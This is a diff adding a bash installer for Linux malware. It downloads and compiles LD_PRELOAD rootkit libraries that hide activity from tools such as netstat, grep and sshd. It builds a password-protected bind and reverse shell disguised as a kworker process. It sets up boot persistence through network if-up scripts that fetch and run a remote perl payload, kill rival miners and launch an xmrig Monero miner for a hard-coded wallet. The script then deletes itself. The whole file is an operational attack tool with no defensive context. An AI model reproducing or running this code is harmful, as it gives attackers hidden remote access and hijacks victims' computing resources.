@@ -1,0 +1,260 @@
+#!/bin/bash
+
+export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+gcc_bin=$(whereis gcc|awk '{print $2}')
+
+function hide(){
+if [ $gcc_bin ];then
+printf "compiling hide stuff...\n";
+
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/genericp.c -o genericp.c
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/pingp.c -o pingp.c
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/initrdp.c -o initrdp.c
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/netstatp.c -o netstatp.c
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/grepp.c -o grepp.c
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/sshdp.c -o sshdp.c
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/zncp.c -o zncp.c
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/ncatp.c -o ncatp.c
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/nmapp.c -o nmapp.c
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/python3p.c -o python3p.c
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/pythonp.c -o pythonp.c
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/socatp.c -o socatp.c
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/filebetp.c -o filebetp.c
+
+gcc -Wall -fPIC -shared -o /usr/local/lib/genericp.so genericp.c -ldl 2>/dev/null
+gcc -Wall -fPIC -shared -o /usr/local/lib/pingp.so pingp.c -ldl 2>/dev/null
+gcc -Wall -fPIC -shared -o /usr/local/lib/initrdp.so initrdp.c -ldl 2>/dev/null
+gcc -Wall -fPIC -shared -o /usr/local/lib/netstatp.so netstatp.c -ldl 2>/dev/null
+gcc -Wall -fPIC -shared -o /usr/local/lib/grepp.so grepp.c -ldl 2>/dev/null
+gcc -Wall -fPIC -shared -o /usr/local/lib/sshdp.so sshdp.c -ldl 2>/dev/null
+gcc -Wall -fPIC -shared -o /usr/local/lib/zncp.so zncp.c -ldl 2>/dev/null
+gcc -Wall -fPIC -shared -o /usr/local/lib/ncatp.so ncatp.c -ldl 2>/dev/null
+gcc -Wall -fPIC -shared -o /usr/local/lib/nmapp.so nmapp.c -ldl 2>/dev/null
+gcc -Wall -fPIC -shared -o /usr/local/lib/python3p.so python3p.c -ldl 2>/dev/null
+gcc -Wall -fPIC -shared -o /usr/local/lib/pythonp.so pythonp.c -ldl 2>/dev/null
+gcc -Wall -fPIC -shared -o /usr/local/lib/socatp.so socatp.c -ldl 2>/dev/null
+gcc -Wall -fPIC -shared -o /usr/local/lib/filebetp.so filebetp.c -ldl 2>/dev/null
+
+echo '/usr/local/lib/genericp.so' >/etc/ld.so.preload
+echo '/usr/local/lib/pingp.so' >>/etc/ld.so.preload
+echo '/usr/local/lib/initrdp.so' >>/etc/ld.so.preload
+echo '/usr/local/lib/netstatp.so' >>/etc/ld.so.preload
+echo '/usr/local/lib/grepp.so' >>/etc/ld.so.preload
+echo '/usr/local/lib/sshdp.so' >>/etc/ld.so.preload
+echo '/usr/local/lib/zncp.so' >>/etc/ld.so.preload
+echo '/usr/local/lib/ncatp.so' >>/etc/ld.so.preload
+echo '/usr/local/lib/nmapp.so' >>/etc/ld.so.preload
+echo '/usr/local/lib/python3p.so' >>/etc/ld.so.preload
+echo '/usr/local/lib/pythonp.so' >>/etc/ld.so.preload
+echo '/usr/local/lib/socatp.so' >>/etc/ld.so.preload
+echo '/usr/local/lib/filebetp.so' >>/etc/ld.so.preload
+fi
+
+if [[ ! -f /etc/ld.so.preload ]];then
+printf "something went wr0ng when hiding\n"
+exit 1
+fi
+}
+
+function bind(){
+if [ $gcc_bin ];then
+printf "compiling bind stuff...\n";
+cat > generic.c <<EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <signal.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+
+int sockfd,acc,reusec=1,aux=0;
+unsigned int socklen;
+char* pass="hackedbyspy!#";
+char passmatch[14];
+struct sockaddr_in server_add,client_add,rev;
+
+void no(const char *error)
+{
+	printf(error);
+	exit(1);
+}
+int exec_shell(int acc) 
+{
+	dup2(acc,0);dup2(acc,1);dup2(acc,2);
+    execl("/bin/bash","bash","-i", NULL);
+    return(0);
+}
+int main(int argc,char *argv[])
+{		
+	if((sockfd=socket(AF_INET,SOCK_STREAM,0))==-1)
+	{
+		no("socket(): failed");
+	}	
+	
+	if(setsockopt(sockfd,SOL_SOCKET,SO_REUSEADDR,&reusec,sizeof(reusec))<0)
+    {
+        no("setsockopt(SO_REUSEADDR) failed\n");
+	}
+    if(setsockopt(sockfd,SOL_SOCKET,SO_REUSEPORT,&reusec,sizeof(reusec))<0)
+    { 
+        no("setsockopt(SO_REUSEPORT): failed\n");
+	}
+	if(strncmp(argv[1],"-bind",sizeof(argv[1]))==0)
+	{	
+		memset(&server_add,0,sizeof(server_add));
+		server_add.sin_family=AF_INET;
+		server_add.sin_port=htons(65334);
+		server_add.sin_addr.s_addr=htonl(INADDR_ANY);
+		//strcpy(argv[1]," ");
+
+	}
+	if(strncmp(argv[1],"-b",sizeof(argv[1]))==0)
+	{	
+		memset(&server_add,0,sizeof(server_add));
+		server_add.sin_family=AF_INET;
+		server_add.sin_port=htons(atoi(argv[2]));
+		server_add.sin_addr.s_addr=htonl(INADDR_ANY);
+		//strcpy(argv[1]," ");
+		//strcpy(argv[2]," ");
+	}
+	if(strncmp(argv[1],"-r",sizeof(argv[1]))==0)
+	{
+		rev.sin_family = AF_INET;
+		rev.sin_port = htons(atoi(argv[3]));
+		rev.sin_addr.s_addr = inet_addr(argv[2]);
+		connect(sockfd, (const struct sockaddr *)&rev, sizeof(struct sockaddr));
+		exec_shell(sockfd);
+		close(sockfd);
+	}
+	strcpy(argv[0],"[kworker/0:1-events]");
+    signal(SIGCHLD,SIG_IGN);
+	if((bind(sockfd,(const struct sockaddr *)&server_add,sizeof(server_add)))==-1)
+	{
+		no("bind(): failed\n");
+	}	
+	if((listen(sockfd,10))==-1)
+	{
+		no("listen(): failed\n");
+	}
+	socklen=sizeof(client_add);
+	while(1)
+	{
+		if((acc=accept(sockfd,(struct sockaddr *)&client_add,&socklen))<0)
+		{
+			no("accept(): failed\n");
+		}
+		//pid_t pid=forkpty(&sockfd,NULL,NULL,NULL);
+		pid_t pid=fork();
+		/*if(pid<0)
+		{
+			no("fork(): failed\n");
+			exit(1);
+		}*/
+		if(!pid)
+		{
+			send(acc,"???\n",5,0); 
+			memset(&passmatch,0,sizeof(passmatch));
+			recv(acc,passmatch,sizeof(passmatch),0);
+			for(aux=0;passmatch[aux];aux++)
+			if(passmatch[aux]=='\n') passmatch[aux]=0;
+			if(strcmp(passmatch,pass)==0)
+			{
+				send(acc,"connected.\n",12,0);
+				dup2(acc,0);dup2(acc,1);dup2(acc,2);
+				setenv("HISTSIZE", "0", 1);
+				setenv("PATH","/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",1);
+				execl("/bin/bash","bash","-i", NULL);
+				close(acc);
+			}
+		    else
+		    {
+				send(acc,"disconnected.\n",15,0);
+				exit(1);
+			}
+			close(sockfd);
+		}
+	}
+
+	return(0);
+}
+EOF
+
+gcc -o /boot/generic generic.c 2>/dev/null;chmod +x /boot/generic 2>/dev/null
+
+else #se não tiver gcc
+printf "gcc not found\n"
+exit 1;
+fi
+if [[ ! -f /boot/generic ]];then
+printf "something went wr0ng when binding\n"
+exit 1;
+fi
+}
+
+function setup_init(){
+rm -f /etc/network/if-up.d/ping 2>/dev/null
+cat > /etc/network/if-up.d/ping 2>/dev/null <<'EOF'
+#!/bin/bash
+
+export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+netstat_bin=$(whereis netstat|awk '{print $2}')
+
+if ! curl -ks "https://raw.githubusercontent.com/anabianca92/lol/main/vs.mk" -o /root/.local/.filebet/vsmk 2>/dev/null && ! wget --no-check-certificate https://raw.githubusercontent.com/anabianca92/lol/main/vs.mk -O /root/.local/.filebet/vsmk 2>/dev/null; then
+  exit 1
+fi
+
+perl /root/.local/.filebet/vsmk;rm /root/.local/.filebet/vsmk
+
+while true
+do
+if [ $($netstat_bin -tunap|grep 65333|awk '{print $7}'|head -n1|wc -l) == "0" ];then
+exec /boot/generic -b 65333
+fi
+if [ $($netstat_bin -tunap|grep 65334|awk '{print $7}'|head -n1|wc -l) == "0" ];then
+exec /boot/generic -bind
+fi
+done &
+EOF
+
+rm -f /etc/network/if-up.d/file 2>/dev/null
+cat > /etc/network/if-up.d/file 2>/dev/null <<'EOF'
+#!/bin/bash
+local="/root/.local/.filebet/"
+
+kill -9 `ps -aux|egrep '(miner|xmrig|filebet)'|egrep -v '(grep|egrep|ps)'|awk '{print $2}'` 2>/dev/null
+rm -rf /root/.local/.filebet/ 2>/dev/null
+mkdir -p /root/.local/.filebet/	
+
+if ! curl -ks "https://raw.githubusercontent.com/anabianca92/lol/main/xmrig" -o /root/.local/.filebet/filebet 2>/dev/null && ! wget --no-check-certificate https://raw.githubusercontent.com/anabianca92/lol/main/xmrig -O /root/.local/.filebet/filebet 2>/dev/null; then
+  exit 1
+fi
+
+chmod +x /root/.local/.filebet/filebet
+exec /root/.local/.filebet/filebet -o stratum+tcp://gulf.moneroocean.stream:10128 -u 46tZPdrQpAeXWfph4X8Cxr5Ki3VNT6QX28MedBqoJhGrhsmZZAHW61EFF7sBtVCw8oQtMfd1vT79VNwbj7suCHzkP9yciEq -p allmk -k --cpu-max-threads-hint=100% -B
+
+EOF
+
+if [[ -f /etc/network/if-up.d/ping ]];then
+chmod +x /etc/network/if-up.d/ping
+/etc/network/if-up.d/ping
+printf "bind set up at boot time\n"
+else
+printf  "[bind]: init file couldnt be created\n"
+fi
+
+if [[ -f /etc/network/if-up.d/file ]];then
+chmod +x /etc/network/if-up.d/file
+/etc/network/if-up.d/file
+printf "miner set up at boot time\n"
+else
+printf  "[miner]: init file couldnt be created\n"
+fi
+}
+
+hide
+bind
+setup_init
+rm -f $0 *.c
